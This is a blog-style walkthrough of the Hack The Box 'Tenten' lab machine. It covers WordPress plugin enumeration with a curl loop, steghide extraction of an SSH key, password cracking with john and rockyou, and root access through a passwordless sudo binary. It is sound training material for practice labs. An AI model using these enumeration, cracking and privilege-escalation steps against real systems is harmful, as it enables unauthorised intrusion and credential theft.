---
layout: post
title:  "HTB Tenten Machine Writeup"
date:   2020-1-2 00:10:00 +0000
categories: hackthebox
---

# Nmap scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.7.3
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Job Portal &#8211; Just another WordPress site
Warning: OSScan results may be unreliable
```

# Webapp recon & pwn
Nmap scan leaks wordpress as a title. Wpscan returns a vulnerable plugin = 'job manager' and two users, 'takis' & 'zesk'.
Reading about the vulnerable plugin, it seems we can enumerate the site with the plugin.
We can fuzz this param with a basic bash oneliner.
```
or i in $(seq 1 15); do echo -n " $i "; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep '<title>'; done
 1 <title>Job Application: Hello world! &#8211; Job Portal</title>
 2 <title>Job Application: Sample Page &#8211; Job Portal</title>
 3 <title>Job Application: Auto Draft &#8211; Job Portal</title>
 4 <title>Job Application &#8211; Job Portal</title>
 5 <title>Job Application: Jobs Listing &#8211; Job Portal</title>
 6 <title>Job Application: Job Application &#8211; Job Portal</title>
 7 <title>Job Application: Register &#8211; Job Portal</title>
 8 <title>Job Application: Pen Tester &#8211; Job Portal</title>
 9 <title>Job Application:  &#8211; Job Portal</title>
 10 <title>Job Application: Application &#8211; Job Portal</title>
 11 <title>Job Application: cube &#8211; Job Portal</title>
 12 <title>Job Application: Application &#8211; Job Portal</title>
 13 <title>Job Application: HackerAccessGranted &#8211; Job Portal</title>
 14 <title>Job Application: Application &#8211; Job Portal</title>
 15 <title>Job Application: temp_logo_testing &#8211; Job Portal</title>
```
'hackeraccessgranted' looks interesting, as if someones already pwned the app. Visiting the page shows an image.
We can get the image with wget and start poking steganography techniques at it. Steghide yields something
```
steghide extract -sf HackerAccessGranted.jpg 
Enter passphrase: <blank> 
wrote extracted data to "id_rsa".
```
File we retrieve is a private rsa key which has been encrypted. ssh2john can help us out.
```
ssh2john id_rsa > id.encrypted
root@kali:~/htb/tenten# john id.encrypted --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
superpassword    (id_rsa)
1g 0:00:00:00 DONE (2018-12-12 22:32) 1.123g/s 876444p/s 876444c/s 876444C/s superpassword
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Chmod 600 the file and login with takis user we found before.

# Gaining root.
Again a sudo check reveals all.
```
takis@tenten:~$ sudo -l
Matching Defaults entries for takis on tenten:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/fuckin
```
It seems our current user can run the binary 'fuckin' without a password. Looking at the binary, we can see its simply calling bash with root permissions so we can abuse this to read the root file.
```
takis@tenten:/bin$ sudo fuckin id
uid=0(root) gid=0(root) groups=0(root)

takis@tenten:/bin$ sudo fuckin cat /root/root.txt
<redacted>
```

done and dusted.
